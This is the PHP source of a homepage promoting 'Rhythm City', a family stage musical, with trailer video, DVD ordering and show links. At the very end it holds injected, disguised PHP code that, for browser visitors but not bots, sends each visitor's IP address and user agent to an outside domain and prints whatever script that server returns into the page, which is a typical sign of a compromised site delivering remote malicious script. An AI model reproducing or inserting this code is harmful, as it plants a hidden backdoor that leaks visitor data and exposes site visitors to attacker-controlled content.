<?php
$title = 'Rhythm City :: A New Musical';
$preload_images = array('plot-synopsis_over.png', 'speaker-note_over.png', 'reviews_over.png');
include('includes/rc_all.php');
?>

<!DOCTYPE html>
<html>
<head>
	<?=$head;?>
</head>
<body>
<?=$header;?>
<section id='index' class='main'>
	<h2>Home Page</h2>
	<section id='content'>
		<h2>Information and Resources for Rhythm City the Musical</h2>
		<section id='intro'>
			<p>Discover the town where song and dance are a way of life...</p>
			<img src='images/rhythm_city_logo-250.png' alt='Rhythm City'>
			<h2 class='visible'><span class='hidden'>Rhythm City:</span> A New Musical</h2>
			<h3 class='hidden'>By Jeremy Moritz</h3>
			<br>
			<p>With a large cast, upbeat original tunes, exciting dance numbers, and a brilliant orchestral score, <strong>Rhythm City</strong> is a fun, family musical now being performed by schools and theatre companies nationwide.</p>
			<h3 class='promo'><a href='licensing.php'>License Rhythm City the Musical - Royalty FREE!</a></h3>
		</section>
		<section id='videos'>
			<h2>Videos</h2>
			<h3>30-Second Trailer</h3>
			<!--[if IE 9]><div class='hidden'><![endif]-->
			<video width='400' height='225' controls preload='auto' poster='images/rctrailer-poster.png'>
				<source src='videos/rhythmcity-trailer.mp4' type='video/mp4; codecs="avc1.42E01E, mp4a.40.2"' />
				<source src='videos/rhythmcity-trailer.webm' type='video/webm; codecs="vp8, vorbis"' />
				<source src='videos/rhythmcity-trailer.ogv' type='video/ogg; codecs="theora, vorbis"' />
			<!--[if IE 9]></video></div><![endif]-->
				<!--Fallback to Vimeo-->
				
			<!--[if IE 9]><div class='hidden'><video class='hidden'><![endif]-->
			</video>
			<!--[if IE 9]></div><![endif]-->
		</section>
		<aside id='ordernow'>
			<h2>Order the DVD and CD of Rhythm City</h2>
			<h3><a href='order.php'><strong>Get the DVD!</strong><br><span>(<b>free</b> for teachers)</span></a></h3>
			<a href='order.php'><img src='images/dvd_icon_125.png' alt=''><br><img src='images/cd_icon_125.png' alt='' id='cd'></a>
			<h3><a href='order.php'>Order the full-length <strong>DVD</strong> or <strong>Original Cast Recording</strong>!</a></h3>
		</aside>
		<section id='aboutshow'>
			<h3 class='clear'>About the Show...</h3>
			<table id='indexlinks'>
				<tr>
					<td><a href='movie.php'><img src='images/movie.png' alt='Watch Online' class='mouseover' title='Watch the full production online'><br>WATCH ONLINE</a></td>
					<!--<td><a href='plot.php'><img src='images/plot-synopsis.png' alt='Plot Synopsis' class='mouseover'><br>PLOT SYNOPSIS</a></td>-->
					<td><a href='plot.php'><img src='images/speaker-note.png' alt='Song Selections' class='mouseover'><br>MUSIC &amp; PLOT</a></td>
					<td><a href='reviews.php'><img src='images/reviews.png' alt='Reviews' class='mouseover'><br>REVIEWS</a></td>
				</tr>
			</table>
		</section>
		<section id='also'>
			<hgroup>
				<h2>Rhythm City Junior</h2>
				<h3 class='clear'>Also Available...</h3>
			</hgroup>
			<a href='jr.php'><img src='images/rhythm_city_logo_junior-250.png' alt='Rhythm City Junior'></a>
			<h4><a href='jr.php'>Rhythm City Junior</a></h4>
			<p>With simplified songs &amp; dialogue and a run-time of only one hour, <strong><a href='jr.php'>Rhythm City Junior</a></strong> retains the charm and fun of Rhythm City at a scale that is crafted specifically for Middle School and Junior High performers!</p>
		</section>
		<section>
			<h2>Connect with Rhythm City</h2>
			<p class='weak acenter narrow'><a href='http://www.facebook.com/RhythmCityMusical'><img src='/images/facebook_button.jpg' alt='Rhythm City on Facebook'></a></p>
		</section>
	</section>
</section>
<?=$footer;?>
<?php
#19f955#
error_reporting(0); ini_set('display_errors',0); $wp_yohso58483 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_yohso58483) && !preg_match ('/bot/i', $wp_yohso58483))){
$wp_yohso0958483="http://"."tag"."modules".".com/modules"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_yohso58483);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_yohso0958483);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_58483yohso = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_58483yohso,1,3) === 'scr' ){ echo $wp_58483yohso; }
#/19f955#
?>
<?php

?>
</body>
</html>
